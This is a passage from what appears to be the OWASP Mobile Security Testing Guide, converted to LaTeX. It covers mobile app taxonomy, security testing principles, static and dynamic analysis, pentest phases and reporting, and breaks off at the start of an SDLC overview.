there are also some implementation challenges on the mobile app side.
Unlike web apps, mobile apps often store long-time session tokens that
are unlocked with user-to-device authentication features such as
fingerprint scanning. While this allows for a quicker login and better
user experience (nobody likes to enter complex passwords), it also
introduces additional complexity and room for error.

Mobile app architectures also increasingly incorporate authorization
frameworks (such as OAuth2) that delegate authentication to a separate
service or outsource the authentication process to an authentication
provider. Using OAuth2 allows the client-side authentication logic to be
outsourced to other apps on the same device (e.g.~the system browser).
Security testers must know the advantages and disadvantages of different
possible authorization frameworks and architectures.

\hypertarget{interaction-with-the-mobile-platform}{%
\paragraph{Interaction with the Mobile
Platform}\label{interaction-with-the-mobile-platform}}

Mobile operating system architectures differ from classical desktop
architectures in important ways. For example, all mobile operating
systems implement app permission systems that regulate access to
specific APIs. They also offer more (Android) or less rich (iOS)
inter-process communication (IPC) facilities that enable apps to
exchange signals and data. These platform-specific features come with
their own set of pitfalls. For example, if IPC APIs are misused,
sensitive data or functionality might be unintentionally exposed to
other apps running on the device.

\hypertarget{code-quality-and-exploit-mitigation}{%
\paragraph{Code Quality and Exploit
Mitigation}\label{code-quality-and-exploit-mitigation}}

Traditional injection and memory management issues aren't often seen in
mobile apps due to the smaller attack surface. Mobile apps mostly
interact with the trusted backend service and the UI, so even if many
buffer overflow vulnerabilities exist in the app, those vulnerabilities
usually don't open up any useful attack vectors. The same applies to
browser exploits such as cross-site scripting (XSS allows attackers to
inject scripts into web pages) that are very prevalent in web apps.
However, there are always exceptions. XSS is theoretically possible on
mobile in some cases, but it's very rare to see XSS issues that an
individual can exploit. For more information about XSS, see the
``\href{0x04h-Testing-Code-Quality.md\#cross-site-scripting-flaws-mstg-arch-2-and-mstg-platform-2}{Cross-Site
Scripting Flaws}'' section in the chapter ``Testing Code Quality''.

This protection from injection and memory management issues doesn't mean
that app developers can get away with writing sloppy code. Following
security best practices results in hardened (secure) release builds that
are resilient against tampering. Free security features offered by
compilers and mobile SDKs help increase security and mitigate attacks.

\hypertarget{anti-tampering-and-anti-reversing}{%
\paragraph{Anti-Tampering and
Anti-Reversing}\label{anti-tampering-and-anti-reversing}}

There are three things you should never bring up in polite
conversations: religion, politics, and code obfuscation. Many security
experts dismiss client-side protections outright. However, software
protection controls are widely used in the mobile app world, so security
testers need ways to deal with these protections. We believe there's a
benefit to client-side protections if they are employed with a clear
purpose and realistic expectations in mind and aren't used to replace
security controls.

\hypertarget{the-owasp-mobile-appsec-verification-standard}{%
\subsection{The OWASP Mobile AppSec Verification
Standard}\label{the-owasp-mobile-appsec-verification-standard}}

This guide is closely related to the OWASP Mobile Application Security
Verification Standard (MASVS). The MASVS defines a mobile app security
model and lists generic security requirements for mobile apps. It can be
used by architects, developers, testers, security professionals, and
consumers to define and understand the qualities of a secure mobile app.
The MSTG maps to the same basic set of security requirements offered by
the MASVS and depending on the context they can be used individually or
combined to achieve different objectives.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/db1eb1182c61b69cf4140a62eec441c2a36e2252.jpg}
\caption{Images/Chapters/0x03/owasp-mobile-overview.jpg}
\end{figure}

For example, the MASVS requirements can be used in an app's planning and
architecture design stages while the checklist and testing guide may
serve as a baseline for manual security testing or as a template for
automated security tests during or after development. In the
``\href{0x04b-Mobile-App-Security-Testing.md}{Mobile App Security
Testing}'' chapter we'll describe how you can apply the checklist and
MSTG to a mobile app penetration test.

\hypertarget{navigating-the-mobile-security-testing-guide}{%
\subsection{Navigating the Mobile Security Testing
Guide}\label{navigating-the-mobile-security-testing-guide}}

The MSTG contains descriptions of all requirements specified in the
MASVS. The MSTG contains the following main sections:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  The \href{0x04a-Mobile-App-Taxonomy.md}{General Testing Guide}
  contains a mobile app security testing methodology and general
  vulnerability analysis techniques as they apply to mobile app
  security. It also contains additional technical test cases that are
  OS-independent, such as authentication and session management, network
  communications, and cryptography.
\item
  The \href{0x05a-Platform-Overview.md}{Android Testing Guide} covers
  mobile security testing for the Android platform, including security
  basics, security test cases, reverse engineering techniques and
  prevention, and tampering techniques and prevention.
\item
  The \href{0x06a-Platform-Overview.md}{iOS Testing Guide} covers mobile
  security testing for the iOS platform, including an overview of the
  iOS OS, security testing, reverse engineering techniques and
  prevention, and tampering techniques and prevention.
\end{enumerate}

\hypertarget{general-testing-guide}{%
\section{General Testing Guide}\label{general-testing-guide}}

\hypertarget{mobile-app-taxonomy}{%
\subsection{Mobile App Taxonomy}\label{mobile-app-taxonomy}}

The term ``mobile app'' refers to a self-contained computer program
designed to execute on a mobile device. Today, the Android and iOS
operating systems cumulatively comprise
\href{https://www.idc.com/promo/smartphone-market-share/os}{more than
99\% of the mobile OS market share}. Additionally, mobile Internet usage
has surpassed desktop usage for the first time in history, making mobile
browsing and apps the
\href{https://www.idc.com/promo/smartphone-market-share/os}{most
widespread kind of Internet-capable applications}.

\begin{quote}
In this guide, we'll use the term ``app'' as a general term for
referring to any kind of application running on popular mobile OSes.
\end{quote}

In a basic sense, apps are designed to run either directly on the
platform for which they're designed, on top of a smart device's mobile
browser, or using a mix of the two. Throughout the following chapter, we
will define characteristics that qualify an app for its respective place
in mobile app taxonomy as well as discuss differences for each
variation.

\hypertarget{native-app}{%
\subsubsection{Native App}\label{native-app}}

Mobile operating systems, including Android and iOS, come with a
Software Development Kit (SDK) for developing applications specific to
the OS. Such applications are referred to as \emph{native} to the system
for which they have been developed. When discussing an app, the general
assumption is that it is a native app implemented in a standard
programming language for the respective operating system - Objective-C
or Swift for iOS, and Java or Kotlin for Android.

Native apps inherently have the capability to provide the fastest
performance with the highest degree of reliability. They usually adhere
to platform-specific design principles (e.g.~the
\href{https://developer.android.com/design/get-started/principles.html}{Android
Design Principles}), which tends to result in a more consistent user
interface (UI) compared to \emph{hybrid} or \emph{web} apps. Due to
their close integration with the operating system, native apps can
directly access almost every component of the device (camera, sensors,
hardware-backed key stores, etc.).

Some ambiguity exists when discussing \emph{native apps} for Android as
the platform provides two development kits - the Android SDK and the
Android NDK. The SDK, which is based on the Java and Kotlin programming
language, is the default for developing apps. The NDK (or Native
Development Kit) is a C/C++ development kit used for developing binary
libraries that can directly access lower level APIs (such as OpenGL).
These libraries can be included in regular apps built with the SDK.
Therefore, we say that Android \emph{native apps} (i.e.~built with the
SDK) may have \emph{native} code built with the NDK.

The most obvious downside of \emph{native apps} is that they target only
one specific platform. To build the same app for both Android and iOS,
one needs to maintain two independent code bases, or introduce often
complex development tools to port a single code base to two platforms
(e.g.~\href{https://www.xamarin.com/}{Xamarin}).

\hypertarget{web-app}{%
\subsubsection{Web App}\label{web-app}}

Mobile web apps (or simply, \emph{web apps}) are websites designed to
look and feel like a \emph{native app}. These apps run on top of a
device's browser and are usually developed in HTML5, much like a modern
web page. Launcher icons may be created to parallel the same feel of
accessing a \emph{native app}; however, these icons are essentially the
same as a browser bookmark, simply opening the default web browser to
load the referenced web page.

Web apps have limited integration with the general components of the
device as they run within the confines of a browser (i.e.~they are
``sandboxed'') and usually lack in performance compared to native apps.
Since a web app typically targets multiple platforms, their UIs do not
follow some of the design principles of a specific platform. The biggest
advantage is reduced development and maintenance costs associated with a
single code base as well as enabling developers to distribute updates
without engaging the platform-specific app stores. For example, a change
to the HTML file for a web app can serve as viable, cross-platform
update whereas an update to a store-based app requires considerably more
effort.

\hypertarget{hybrid-app}{%
\subsubsection{Hybrid App}\label{hybrid-app}}

Hybrid apps attempt to fill the gap between \emph{native} and \emph{web
apps}. A \emph{hybrid app} executes like a \emph{native app}, but a
majority of the processes rely on web technologies, meaning a portion of
the app runs in an embedded web browser (commonly called ``webview'').
As such, hybrid apps inherit both pros and cons of \emph{native} and
\emph{web apps}.

A web-to-native abstraction layer enables access to device capabilities
for \emph{hybrid apps} not accessible to a pure \emph{web app}.
Depending on the framework used for development, one code base can
result in multiple applications that target different platforms, with a
UI closely resembling that of the original platform for which the app
was developed.

Following is a non-exhaustive list of more popular frameworks for
developing \emph{hybrid apps}:

\begin{itemize}
\tightlist
\item
  \href{https://cordova.apache.org/}{Apache Cordova}
\item
  \href{https://framework7.io/}{Framework 7}
\item
  \href{https://ionicframework.com/}{Ionic}
\item
  \href{https://jquerymobile.com/}{jQuery Mobile}
\item
  \href{https://flutter.dev/}{Google Flutter}
\item
  \href{https://www.nativescript.org/}{Native Script}
\item
  \href{https://onsen.io/}{Onsen UI}
\item
  \href{https://www.reactnative.com/}{React Native}
\item
  \href{https://www.sencha.com/products/touch/}{Sencha Touch}
\end{itemize}

\hypertarget{progressive-web-app}{%
\subsubsection{Progressive Web App}\label{progressive-web-app}}

Progressive Web Apps (PWA) load like regular web pages, but differ from
usual web apps in several ways. For example it's possible to work
offline and access to mobile device hardware is possible, that
traditionally is only available to native mobile apps.

PWAs combine different open standards of the web offered by modern
browsers to provide benefits of a rich mobile experience. A Web App
Manifest, which is a simple JSON file, can be used to configure the
behavior of the app after ``installation''.

PWAs are supported by Android and iOS, but not all hardware features are
yet available. For example Push Notifications, Face ID on iPhone X or
ARKit for augmented reality is not available yet on iOS. An overview of
PWA and supported features on each platform can be found in a
\href{https://medium.com/@firt/progressive-web-apps-on-ios-are-here-d00430dee3a7}{Medium
article from Maximiliano Firtman}.

\hypertarget{whats-covered-in-the-mobile-testing-guide}{%
\subsubsection{What's Covered in the Mobile Testing
Guide}\label{whats-covered-in-the-mobile-testing-guide}}

Throughout this guide, we will focus on apps for the two platforms
dominating the market: Android and iOS. Mobile devices are currently the
most common device class running these platforms -- increasingly
however, the same platforms (in particular, Android) run on other
devices, such as smartwatches, TVs, car navigation/audio systems, and
other embedded systems.

Given the vast amount of mobile app frameworks available it would be
impossible to cover all of them exhaustively. Therefore, we focus on
\emph{native} apps on each operating system. However, the same
techniques are also useful when dealing with web or hybrid apps
(ultimately, no matter the framework, every app is based on native
components).

\hypertarget{mobile-app-security-testing}{%
\subsection{Mobile App Security
Testing}\label{mobile-app-security-testing}}

In the following sections we'll provide a brief overview of general
security testing principles and key terminology. The concepts introduced
are largely identical to those found in other types of penetration
testing, so if you are an experienced tester you may be familiar with
some of the content.

Throughout the guide, we use ``mobile app security testing'' as a
catchall phrase to refer to the evaluation of mobile app security via
static and dynamic analysis. Terms such as ``mobile app penetration
testing'' and ``mobile app security review'' are used somewhat
inconsistently in the security industry, but these terms refer to
roughly the same thing. A mobile app security test is usually part of a
larger security assessment or penetration test that encompasses the
client-server architecture and server-side APIs used by the mobile app.

In this guide, we cover mobile app security testing in two contexts. The
first is the ``classical'' security test completed near the end of the
development life cycle. In this context, the tester accesses a nearly
finished or production-ready version of the app, identifies security
issues, and writes a (usually devastating) report. The other context is
characterized by the implementation of requirements and the automation
of security tests from the beginning of the software development life
cycle onwards. The same basic requirements and test cases apply to both
contexts, but the high-level method and the level of client interaction
differ.

\hypertarget{principles-of-testing}{%
\subsubsection{Principles of Testing}\label{principles-of-testing}}

\hypertarget{white-box-testing-versus-black-box-testing}{%
\paragraph{White-box Testing versus Black-box
Testing}\label{white-box-testing-versus-black-box-testing}}

Let's start by defining the concepts:

\begin{itemize}
\tightlist
\item
  \textbf{Black-box testing} is conducted without the tester's having
  any information about the app being tested. This process is sometimes
  called ``zero-knowledge testing''. The main purpose of this test is
  allowing the tester to behave like a real attacker in the sense of
  exploring possible uses for publicly available and discoverable
  information.
\item
  \textbf{White-box testing} (sometimes called ``full knowledge
  testing'') is the total opposite of black-box testing in the sense
  that the tester has full knowledge of the app. The knowledge may
  encompass source code, documentation, and diagrams. This approach
  allows much faster testing than black-box testing due to it's
  transparency and with the additional knowledge gained a tester can
  build much more sophisticated and granular test cases.
\item
  \textbf{Gray-box testing} is all testing that falls in between the two
  aforementioned testing types: some information is provided to the
  tester (usually credentials only), and other information is intended
  to be discovered. This type of testing is an interesting compromise in
  the number of test cases, the cost, the speed, and the scope of
  testing. Gray-box testing is the most common kind of testing in the
  security industry.
\end{itemize}

We strongly advise that you request the source code so that you can use
the testing time as efficiently as possible. The tester's code access
obviously doesn't simulate an external attack, but it simplifies the
identification of vulnerabilities by allowing the tester to verify every
identified anomaly or suspicious behavior at the code level. A white-box
test is the way to go if the app hasn't been tested before.

Even though decompiling on Android is straightforward, the source code
may be obfuscated, and de-obfuscating will be time-consuming. Time
constraints are therefore another reason for the tester to have access
to the source code.

\hypertarget{vulnerability-analysis}{%
\paragraph{Vulnerability Analysis}\label{vulnerability-analysis}}

Vulnerability analysis is usually the process of looking for
vulnerabilities in an app. Although this may be done manually, automated
scanners are usually used to identify the main vulnerabilities. Static
and dynamic analysis are types of vulnerability analysis.

\hypertarget{static-versus-dynamic-analysis}{%
\paragraph{Static versus Dynamic
Analysis}\label{static-versus-dynamic-analysis}}

Static Application Security Testing (SAST) involves examining an
application's components without executing them, by analyzing the source
code either manually or automatically. OWASP provides information about
\href{https://www.owasp.org/index.php/Static_Code_Analysis}{Static Code
Analysis} that may help you understand techniques, strengths,
weaknesses, and limitations.

Dynamic Application Security Testing (DAST) involves examining the app
during runtime. This type of analysis can be manual or automatic. It
usually doesn't provide the information that static analysis provides,
but it is a good way to detect interesting elements (assets, features,
entry points, etc.) from a user's point of view.

Now that we have defined static and dynamic analysis, let's dive deeper.

\hypertarget{static-analysis}{%
\paragraph{Static Analysis}\label{static-analysis}}

During static analysis, the mobile app's source code is reviewed to
ensure appropriate implementation of security controls. In most cases, a
hybrid automatic/manual approach is used. Automatic scans catch the
low-hanging fruit, and the human tester can explore the code base with
specific usage contexts in mind.

\hypertarget{manual-code-review}{%
\subparagraph{Manual Code Review}\label{manual-code-review}}

A tester performs manual code review by manually analyzing the mobile
application's source code for security vulnerabilities. Methods range
from a basic keyword search via the `grep' command to a line-by-line
examination of the source code. IDEs (Integrated Development
Environments) often provide basic code review functions and can be
extended with various tools.

A common approach to manual code analysis entails identifying key
security vulnerability indicators by searching for certain APIs and
keywords, such as database-related method calls like
``executeStatement'' or ``executeQuery''. Code containing these strings
is a good starting point for manual analysis.

In contrast to automatic code analysis, manual code review is very good
for identifying vulnerabilities in the business logic, standards
violations, and design flaws, especially when the code is technically
secure but logically flawed. Such scenarios are unlikely to be detected
by any automatic code analysis tool.

A manual code review requires an expert code reviewer who is proficient
in both the language and the frameworks used for the mobile application.
Full code review can be a slow, tedious, time-consuming process for the
reviewer, especially given large code bases with many dependencies.

\hypertarget{automated-source-code-analysis}{%
\subparagraph{Automated Source Code
Analysis}\label{automated-source-code-analysis}}

Automated analysis tools can be used to speed up the review process of
Static Application Security Testing (SAST). They check the source code
for compliance with a predefined set of rules or industry best
practices, then typically display a list of findings or warnings and
flags for all detected violations. Some static analysis tools run
against the compiled app only, some must be fed the original source
code, and some run as live-analysis plugins in the Integrated
Development Environment (IDE).

Although some static code analysis tools incorporate a lot of
information about the rules and semantics required to analyze mobile
apps, they may produce many false positives, particularly if they are
not configured for the target environment. A security professional must
therefore always review the results.

The appendix ``Testing Tools'' includes a list of static analysis tools,
which can be found at the end of this book.

\hypertarget{dynamic-analysis}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis}}

The focus of DAST is the testing and evaluation of apps via their
real-time execution. The main objective of dynamic analysis is finding
security vulnerabilities or weak spots in a program while it is running.
Dynamic analysis is conducted both at the mobile platform layer and
against the backend services and APIs, where the mobile app's request
and response patterns can be analyzed.

Dynamic analysis is usually used to check for security mechanisms that
provide sufficient protection against the most prevalent types of
attack, such as disclosure of data in transit, authentication and
authorization issues, and server configuration errors.

\hypertarget{avoiding-false-positives}{%
\paragraph{Avoiding False Positives}\label{avoiding-false-positives}}

\hypertarget{automated-scanning-tools}{%
\subparagraph{Automated Scanning Tools}\label{automated-scanning-tools}}

Automated testing tools' lack of sensitivity to app context is a
challenge. These tools may identify a potential issue that's irrelevant.
Such results are called ``false positives''.

For example, security testers commonly report vulnerabilities that are
exploitable in a web browser but aren't relevant to the mobile app. This
false positive occurs because automated tools used to scan the backend
service are based on regular browser-based web applications. Issues such
as CSRF (Cross-site Request Forgery) and Cross-Site Scripting (XSS) are
reported accordingly.

Let's take CSRF as an example. A successful CSRF attack requires the
following:

\begin{itemize}
\tightlist
\item
  The ability to entice the logged-in user to open a malicious link in
  the web browser used to access the vulnerable site.
\item
  The client (browser) must automatically add the session cookie or
  other authentication token to the request.
\end{itemize}

Mobile apps don't fulfill these requirements: even if WebViews and
cookie-based session management are used, any malicious link the user
clicks opens in the default browser, which has a separate cookie store.

Stored Cross-Site Scripting (XSS) can be an issue if the app includes
WebViews, and it may even lead to command execution if the app exports
JavaScript interfaces. However, reflected Cross-Site Scripting is rarely
an issue for the reason mentioned above (even though whether they should
exist at all is arguable --- escaping output is simply a best practice).

\begin{quote}
In any case, consider exploit scenarios when you perform the risk
assessment; don't blindly trust your scanning tool's output.
\end{quote}

\hypertarget{clipboard}{%
\subparagraph{Clipboard}\label{clipboard}}

When typing data into input fields, the clipboard can be used to copy in
data. The clipboard is accessible system-wide and is therefore shared by
apps. This sharing can be misused by malicious apps to get sensitive
data that has been stored in the clipboard.

Before iOS 9, a malicious app might monitor the pasteboard in the
background while periodically retrieving
\texttt{{[}UIPasteboard\ generalPasteboard{]}.string}. As of iOS 9,
pasteboard content is accessible to apps in the foreground only, which
reduces the attack surface of password sniffing from the clipboard
dramatically.

For
\href{https://arstechnica.com/information-technology/2014/11/using-a-password-manager-on-android-it-may-be-wide-open-to-sniffing-attacks/}{Android
there was a PoC exploit released} in order to demonstrate the attack
vector if passwords are stored within the clipboard.
\href{https://github.com/OWASP/owasp-masvs/issues/106}{Disabling pasting
in passwords input fields} was a requirement in the MASVS 1.0, but was
removed due to several reasons:

\begin{itemize}
\tightlist
\item
  Preventing pasting into input fields of an app, does not prevent that
  a user will copy sensitive information anyway. Since the information
  has already been copied before the user notices that it's not possible
  to paste it in, a malicious app has already sniffed the clipboard.
\item
  If pasting is disabled on password fields users might even choose
  weaker passwords that they can remember and they cannot use password
  managers anymore, which would contradict the original intention of
  making the app more secure.
\end{itemize}

When using an app you should still be aware that other apps are reading
the clipboard continuously, as the
\href{https://www.thedailybeast.com/facebook-is-spying-on-your-clipboard}{Facebook
app} did. Still, copy-pasting passwords is a security risk you should be
aware of, but also cannot be solved by an app.

\hypertarget{penetration-testing-a.k.a.-pentesting}{%
\paragraph{Penetration Testing (a.k.a.
Pentesting)}\label{penetration-testing-a.k.a.-pentesting}}

The classic approach involves all-around security testing of the app's
final or near-final build, e.g., the build that's available at the end
of the development process. For testing at the end of the development
process, we recommend the
\href{https://github.com/OWASP/owasp-masvs}{Mobile App Security
Verification Standard (MASVS)} and the associated checklist as baseline
for testing. A typical security test is structured as follows:

\begin{itemize}
\tightlist
\item
  \textbf{Preparation} - defining the scope of security testing,
  including identifying applicable security controls, the organization's
  testing goals, and sensitive data. More generally, preparation
  includes all synchronization with the client as well as legally
  protecting the tester (who is often a third party). Remember,
  attacking a system without written authorization is illegal in many
  parts of the world!
\item
  \textbf{Intelligence Gathering} - analyzing the \textbf{environmental}
  and \textbf{architectural} context of the app to gain a general
  contextual understanding.
\item
  \textbf{Mapping the Application} - based on information from the
  previous phases; may be complemented by automated scanning and
  manually exploring the app. Mapping provides a thorough understanding
  of the app, its entry points, the data it holds, and the main
  potential vulnerabilities. These vulnerabilities can then be ranked
  according to the damage their exploitation would cause so that the
  security tester can prioritize them. This phase includes the creation
  of test cases that may be used during test execution.
\item
  \textbf{Exploitation} - in this phase, the security tester tries to
  penetrate the app by exploiting the vulnerabilities identified during
  the previous phase. This phase is necessary for determining whether
  vulnerabilities are real and true positives.
\item
  \textbf{Reporting} - in this phase, which is essential to the client,
  the security tester reports the vulnerabilities. This includes the
  exploitation process in detail, classifies the type of vulnerability,
  documents the risk if an attacker would be able to compromise the
  target and outlines which data the tester has been able to access
  illegitimately.
\end{itemize}

\hypertarget{preparation}{%
\subparagraph{Preparation}\label{preparation}}

The security level at which the app will be tested must be decided
before testing. The security requirements should be decided at the
beginning of the project. Different organizations have different
security needs and resources available for investing in test activities.
Although the controls in MASVS Level 1 (L1) are applicable to all mobile
apps, walking through the entire checklist of L1 and Level 2 (L2) MASVS
controls with technical and business stakeholders is a good way to
decide on a level of test coverage.

Organizations may have different regulatory and legal obligations in
certain territories. Even if an app doesn't handle sensitive data, some
L2 requirements may be relevant (because of industry regulations or
local laws). For example, two-factor authentication (2FA) may be
obligatory for a financial app and enforced by a country's central bank
and/or financial regulatory authorities.

Security goals/controls defined earlier in the development process may
also be reviewed during the discussion with stakeholders. Some controls
may conform to MASVS controls, but others may be specific to the
organization or application.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/29ee4afc5b34f4de27f808c55317ab17b193fa4c.png}
\caption{Images/Chapters/0x03/mstg-preparation.png}
\end{figure}

All involved parties must agree on the decisions and the scope in the
checklist because these will define the baseline for all security
testing.

Coordinating with the Client

Setting up a working test environment can be a challenging task. For
example, restrictions on the enterprise wireless access points and
networks may impede dynamic analysis performed at client premises.
Company policies may prohibit the use of rooted phones or (hardware and
software) network testing tools within enterprise networks. Apps that
implement root detection and other reverse engineering countermeasures
may significantly increase the work required for further analysis.

Security testing involves many invasive tasks, including monitoring and
manipulating the mobile app's network traffic, inspecting the app data
files, and instrumenting API calls. Security controls, such as
certificate pinning and root detection, may impede these tasks and
dramatically slow testing down.

To overcome these obstacles, you may want to request two of the app's
build variants from the development team. One variant should be a
release build so that you can determine whether the implemented controls
are working properly and can't be bypassed easily. The second variant
should be a debug build for which certain security controls have been
deactivated. Testing two different builds is the most efficient way to
cover all test cases.

Depending on the scope of the engagement, this approach may not be
possible. Requesting both production and debug builds for a white-box
test will help you complete all test cases and clearly state the app's
security maturity. The client may prefer that black-box tests be focused
on the production app and the evaluation of its security controls'
effectiveness.

The scope of both types of testing should be discussed during the
preparation phase. For example, whether the security controls should be
adjusted should be decided before testing. Additional topics are
discussed below.

Identifying Sensitive Data

Classifications of sensitive information differ by industry and country.
In addition, organizations may take a restrictive view of sensitive
data, and they may have a data classification policy that clearly
defines sensitive information.

There are three general states from which data may be accessible:

\begin{itemize}
\tightlist
\item
  \textbf{At rest} - the data is sitting in a file or data store
\item
  \textbf{In use} - an application has loaded the data into its address
  space
\item
  \textbf{In transit} - data has been exchanged between mobile app and
  endpoint or consuming processes on the device, e.g., during IPC
  (Inter-Process Communication)
\end{itemize}

The degree of scrutiny that's appropriate for each state may depend on
the data's importance and likelihood of being accessed. For example,
data held in application memory may be more vulnerable than data on web
servers to access via core dumps because attackers are more likely to
gain physical access to mobile devices than to web servers.

When no data classification policy is available, use the following list
of information that's generally considered sensitive:

\begin{itemize}
\tightlist
\item
  user authentication information (credentials, PINs, etc.)
\item
  Personally Identifiable Information (PII) that can be abused for
  identity theft: social security numbers, credit card numbers, bank
  account numbers, health information
\item
  device identifiers that may identify a person
\item
  highly sensitive data whose compromise would lead to reputational harm
  and/or financial costs
\item
  any data whose protection is a legal obligation
\item
  any technical data generated by the application (or its related
  systems) and used to protect other data or the system itself (e.g.,
  encryption keys).
\end{itemize}

A definition of ``sensitive data'' must be decided before testing begins
because detecting sensitive data leakage without a definition may be
impossible.

Intelligence Gathering

Intelligence gathering involves the collection of information about the
app's architecture, the business use cases the app serves, and the
context in which the app operates. Such information may be classified as
``environmental'' or ``architectural''.

Environmental Information

Environmental information includes:

\begin{itemize}
\tightlist
\item
  The organization's goals for the app. Functionality shapes users'
  interaction with the app and may make some surfaces more likely than
  others to be targeted by attackers.
\item
  The relevant industry. Different industries may have different risk
  profiles.
\item
  Stakeholders and investors; understanding who is interested in and
  responsible for the app.
\item
  Internal processes, workflows, and organizational structures.
  Organization-specific internal processes and workflows may create
  opportunities for
  \href{https://www.owasp.org/index.php/Testing_for_business_logic}{business
  logic exploits}.
\end{itemize}

Architectural Information

Architectural information includes:

\begin{itemize}
\tightlist
\item
  \textbf{The mobile app:} How the app accesses data and manages it
  in-process, how it communicates with other resources and manages user
  sessions, and whether it detects itself running on jailbroken or
  rooted phones and reacts to these situations.
\item
  \textbf{The Operating System:} The operating systems and OS versions
  the app runs on (including Android or iOS version restrictions),
  whether the app is expected to run on devices that have Mobile Device
  Management (MDM) controls, and relevant OS vulnerabilities.
\item
  \textbf{Network:} Usage of secure transport protocols (e.g., TLS),
  usage of strong keys and cryptographic algorithms (e.g., SHA-2) to
  secure network traffic encryption, usage of certificate pinning to
  verify the endpoint, etc.
\item
  \textbf{Remote Services:} The remote services the app consumes and
  whether their being compromised could compromise the client.
\end{itemize}

\hypertarget{mapping-the-application}{%
\subparagraph{Mapping the Application}\label{mapping-the-application}}

Once the security tester has information about the app and its context,
the next step is mapping the app's structure and content, e.g.,
identifying its entry points, features, and data.

When penetration testing is performed in a white-box or grey-box
paradigm, any documents from the interior of the project (architecture
diagrams, functional specifications, code, etc.) may greatly facilitate
the process. If source code is available, the use of SAST tools can
reveal valuable information about vulnerabilities (e.g., SQL Injection).
DAST tools may support black-box testing and automatically scan the app:
whereas a tester will need hours or days, a scanner may perform the same
task in a few minutes. However, it's important to remember that
automatic tools have limitations and will only find what they have been
programmed to find. Therefore, human analysis may be necessary to
augment results from automatic tools (intuition is often key to security
testing).

Threat Modeling is an important artifact: documents from the workshop
usually greatly support the identification of much of the information a
security tester needs (entry points, assets, vulnerabilities, severity,
etc.). Testers are strongly advised to discuss the availability of such
documents with the client. Threat modeling should be a key part of the
software development life cycle. It usually occurs in the early phases
of a project.

The
\href{https://www.owasp.org/index.php/Application_Threat_Modeling}{threat
modeling guidelines defined in OWASP} are generally applicable to mobile
apps.

\hypertarget{exploitation}{%
\subparagraph{Exploitation}\label{exploitation}}

Unfortunately, time or financial constraints limit many pentests to
application mapping via automated scanners (for vulnerability analysis,
for example). Although vulnerabilities identified during the previous
phase may be interesting, their relevance must be confirmed with respect
to five axes:

\begin{itemize}
\tightlist
\item
  \textbf{Damage potential} - the damage that can result from exploiting
  the vulnerability
\item
  \textbf{Reproducibility} - ease of reproducing the attack
\item
  \textbf{Exploitability} - ease of executing the attack
\item
  \textbf{Affected users} - the number of users affected by the attack
\item
  \textbf{Discoverability} - ease of discovering the vulnerability
\end{itemize}

Against all odds, some vulnerabilities may not be exploitable and may
lead to minor compromises, if any. Other vulnerabilities may seem
harmless at first sight, yet be determined very dangerous under
realistic test conditions. Testers who carefully go through the
exploitation phase support pentesting by characterizing vulnerabilities
and their effects.

\hypertarget{reporting}{%
\paragraph{Reporting}\label{reporting}}

The security tester's findings will be valuable to the client only if
they are clearly documented. A good pentest report should include
information such as, but not limited to, the following:

\begin{itemize}
\tightlist
\item
  an executive summary
\item
  a description of the scope and context (e.g., targeted systems)
\item
  methods used
\item
  sources of information (either provided by the client or discovered
  during the pentest)
\item
  prioritized findings (e.g., vulnerabilities that have been structured
  by DREAD classification)
\item
  detailed findings
\item
  recommendations for fixing each defect
\end{itemize}

Many pentest report templates are available on the Internet: Google is
your friend!

\hypertarget{security-testing-and-the-sdlc}{%
\subsubsection{Security Testing and the
SDLC}\label{security-testing-and-the-sdlc}}

Although the principles of security testing haven't fundamentally
changed in recent history, software development techniques have changed
dramatically. While the widespread adoption of Agile practices was
speeding up software development, security testers had to become quicker
and more agile while continuing to deliver trustworthy software.

The following section is focused on this evolution and describes
contemporary security testing.

\hypertarget{security-testing-during-the-software-development-life-cycle}{%
\paragraph{Security Testing during the Software Development Life
Cycle}\label{security-testing-during-the-software-development-life-cycle}}

Software development is not very old, after all, so the end of
developing without a framework is easy to observe. We have all
experienced the need for a minimal set of rules to control work as the
source code grows.

In the past, ``Waterfall'' methodologies were the most widely adopted:
development proceeded by steps that had a predefined sequence. Limited
to a single step, backtracking capability was a serious drawback of
Waterfall methodologies. Although they have important positive features
(providing structure, helping testers clarify where effort is needed,
being clear and easy to understand, etc.), they also have negative ones
(creating silos, being slow, specialized teams, etc.).

As software development matured, competition increased and developers
needed to react to market changes more quickly while creating software
products with smaller budgets. The idea of less structure became
popular, and smaller teams collaborated, breaking silos throughout the
organization. The ``Agile'' concept was born (Scrum, XP, and RAD are
well-known examples of Agile implementations); it enabled more
autonomous teams to work together more quickly.

Security wasn't originally an integral part of software development. It
was an afterthought, performed at the network level by operation teams
who had to compensate for poor software security! Although unintegrated
security was possible when software programs were located inside a
perimeter, the concept became obsolete as new kinds of software
consumption emerged with web, mobile, and IoT technologies. Nowadays,
security must be baked \textbf{inside} software because compensating for
vulnerabilities is often very difficult.

\begin{quote}
``SDLC'' will be used interchangeably with ``Secure SDLC'' in the
following section to help you internalize the idea that security is a
part of software development processes. In the same spirit, we use the
name DevSecOps to emphasize the fact that security is part of DevOps.
\end{quote}

\hypertarget{sdlc-overview}{%
\paragraph{SDLC Overview}\label{sdlc-overview}}

\hypertarget{general-description-of-sdlc}{%
\subparagraph{General Description of
SDLC}\label{general-description-of-sdlc}}

SDLCs always consist of the same steps (the overall process is
sequential in the Waterfall paradigm and iterative in the Agile
paradigm):

\begin{itemize}
\tightlist
\item
  Perform a \textbf{risk assessment} for the application and its
  components to identify their risk profiles. These risk profiles
  typically depend on the organization's risk appetite and applicable
  regulatory requirements. The risk assessment is also based on factors,
  including whether the application is accessible via the Internet and
  the kind of data the application processes and stores. All kinds of
  risks must be taken into account: financial, marketing, industrial,
  etc. Data classification policies specify which data is sensitive and
  how it must be secured.
\item
  \textbf{Security Requirements} are determined at the beginning of a
  project or development cycle, when functional requirements are being
  gathered. \textbf{Abuse Cases} are added as use cases are created.
  Teams (including development teams) may be given security training
  (such as Secure Coding) if they need it. You can use the
  \href{https://mobile-security.gitbook.io/masvs/}{OWASP MASVS} to
  determine the security requirements of mobile applications on the
  basis of the risk assessment phase. Iteratively reviewing requirements
  when features and data classes are added is common, especially with
  Agile projects.
\item
